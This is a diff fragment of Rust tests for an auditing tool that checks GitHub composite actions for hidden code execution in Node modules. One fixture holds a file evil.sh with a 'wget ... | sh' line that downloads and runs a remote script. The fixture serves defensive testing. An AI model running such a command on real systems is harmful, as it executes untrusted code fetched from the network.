+                    "require('fs').readFileSync({config});\nconst fs = require('fs');\nfs.readFileSync({config});"
+                )),
+            )],
+        ),
+        (
+            "data helper",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ read }} = require('./lib.js');\nread({config});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.read = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));"),
+                ),
+            ],
+        ),
+        (
+            "unlocated argument",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller("const { run } = require('./lib.js');\nrun(process.env.SCRIPT);"),
+                ),
+                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "argument only logged",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ log }} = require('./lib.js');\nlog({config});"
+                    )),
+                ),
+                (
+                    "lib.js",
+                    lib("exports.log = (message) => console.log('using', message);"),
+                ),
+            ],
+        ),
+        (
+            "data module",
+            false,
+            vec![(
+                "index.js",
+                caller(&format!(
+                    "const pkg = require('./package.json');\nconsole.log(pkg.version, {config});"
+                )),
+            )],
+        ),
+        (
+            "module loaded for its effects",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!("require('./setup.js');\nconsole.log({config});")),
+                ),
+                ("setup.js", lib(&format!("exports.run = {MODULE_RUN};"))),
+            ],
+        ),
+        (
+            "constants read",
+            false,
+            vec![
+                (
+                    "index.js",
+                    caller(&format!(
+                        "const {{ TIMEOUT }} = require('./constants.js');\nconsole.log(TIMEOUT, {config});"
+                    )),
+                ),
+                ("constants.js", "exports.TIMEOUT = 5;\n".to_string()),
+            ],
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Clean);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn inline_node_script_calling_a_module_with_a_location_is_incomplete() {
+    let dir = common::repo_with_local_action(
+        &composite_action(
+            "node {0}",
+            "require('./lib.js').run(require('path').join(process.env.GITHUB_ACTION_PATH, 'evil.sh'));",
+            None,
+        ),
+        &[
+            (
+                "lib.js",
+                "exports.run = (script) => require('child_process').spawnSync('bash', [script]);\n",
+            ),
+            ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
+        ],
+    );
+    let output = common::pinprick_cmd()
+        .args(["audit", "--no-audited-catalog", "--json"])
+        .arg(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(output.status.code(), Some(2), "{report}");
+    assert_eq!(report["coverage_complete"], false, "{report}");
 }
 
 #[test]
